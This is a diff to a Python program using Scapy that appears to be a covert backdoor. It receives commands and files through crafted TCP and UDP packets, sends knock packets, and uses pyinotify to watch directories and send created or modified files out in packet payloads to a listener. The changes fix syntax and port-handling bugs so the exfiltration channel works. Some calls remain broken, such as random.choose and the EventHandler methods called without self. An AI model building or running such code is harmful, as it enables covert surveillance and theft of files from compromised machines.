@@ -277,13 +277,13 @@ def clientCommands(packet):
 	if packet.haslayer(TCP):
 		seq = random.randint(0, 16777215)
 		confirmPacket = IP(dst=packet[IP].src, id=ipid)/\
-			            TCP(sport=packet[TCP].dport, dport=packet[TCP].sport, seq=seq)
+			            TCP(dport=packet[TCP].dport, sport=packet[TCP].sport, seq=seq)
 		if (len(ports) > 0) and (packet[TCP].sport not in ports):
 			confirmPacket[TCP].sport = random.choose(ports)
 		port = packet[TCP].sport
 	elif packet.haslayer(UDP):
 		confirmPacket = IP(dst=packet[IP].src, id=ipid)/\
-			            UDP(sport=packet[UDP].dport, dport=packet[UDP].sport, seq=seq)
+			            UDP(sport=packet[UDP].sport, dport=packet[UDP].dport, seq=seq)
 		if (len(ports) > 0) and (packet[UDP].sport not in ports):
 			confirmPacket[UDP].sport = random.choose(ports)
 		port = packet[UDP].sport
@@ -394,20 +394,20 @@ def sendFile(packet):
 	if packet.haslayer(TCP):
 		with open(encrypt(packet[Raw].load), "w") as tFile:
 			while True:
-				dPacket = sniff(filter=protocol + " src port " + str(packet[TCP].sport) + " and ip src " + packet[IP].src, count=1, timeout=30)
+				dPacket = sniff(filter=protocol + " dst port " + str(packet[TCP].dport) + " and ip src " + packet[IP].src, count=1, timeout=30)
 				if len(dPacket) == 0:
 					break
 				if dPacket[0].haslayer(TCP) != True:
 					continue
 				if dPacket[0][TCP].flags == 1:
 					break
-				if dPacket[0].haslayer(RAW) != True:
+				if dPacket[0].haslayer(Raw) != True:
 					continue
 				tFile.write(encrypt(dPacket[0][Raw].load))
 	elif packet.haslayer(UDP):
 		with open(encrypt(packet[Raw].load), "w") as tFile:
 			while True:
-				dPacket = sniff(filter=protocol + " src port " + str(packet[UDP].sport) + " and ip src " + packet[IP].src, count=1, timeout=30)
+				dPacket = sniff(filter=protocol + " dst port " + str(packet[UDP].dport) + " and ip src " + packet[IP].src, count=1, timeout=30)
 				if len(dPacket) == 0:
 					break
 				if dPacket[0][UDP].sport == 0:
@@ -549,20 +549,18 @@ def terminal(packet):
 -- 
 ---------------------------------------------------------------------------------------------
 '''
-watchMan = pyinotify.WatchManager()
-notifier = pyinotify.ThreadedNotifier(watchMan, EventHandler())
-notifier.start()
 listenerIP = []
-global listenerIP
 def notify(packet):
 	wdd = watchMan.add_watch(encrypt(packet[Raw].load.split()[0]), pyinotify.IN_CREATE | pyinotify.IN_MODIFY, rec=True)
-	listenerIP.append(encrypt(packet[Raw].load.split()[1])
+	listenerIP.append(encrypt(packet[Raw].load.split()[1]))
 
 class EventHandler(pyinotify.ProcessEvent):
 	def process_IN_CREATE(self, event):
-		sendKnock():
+		sendKnock()
+		sendFile(event)
 	def process_IN_MODIFY(self, event):
-		sendKnock():
+		sendKnock()
+		sendFile(event)
 	def sendKnock(self):
 		seq = random.randint(0, 16777215)
 		ipid = random.randint(0, 65535)
@@ -580,7 +578,7 @@ class EventHandler(pyinotify.ProcessEvent):
 	def sendFile(self, event):
 		commandPacket = IP(dst="127.0.0.1", id=random.randint(0, 65535))/\
 				        TCP(sport=random.randint(0, 65535), dport=random.randint(0, 65535), seq=random.randint(0, 16777215), flags="")/\
-				        Raw(load=encrypt(event.pathname.split("/")[len(event.pathname.split("/"))-1])
+				        Raw(load=encrypt(event.pathname.split("/")[len(event.pathname.split("/"))-1]))
 		send(commandPacket, verbose=0)
 		with open(event.pathname, "r") as tFile:
 			for line in tFile:
@@ -597,6 +595,10 @@ class EventHandler(pyinotify.ProcessEvent):
 		commandPacket[TCP].flags="F"
 		
 		send(commandPacket, verbose=0) 
+
+watchMan = pyinotify.WatchManager()
+notifier = pyinotify.ThreadedNotifier(watchMan, EventHandler())
+notifier.start()
 
 main()
 
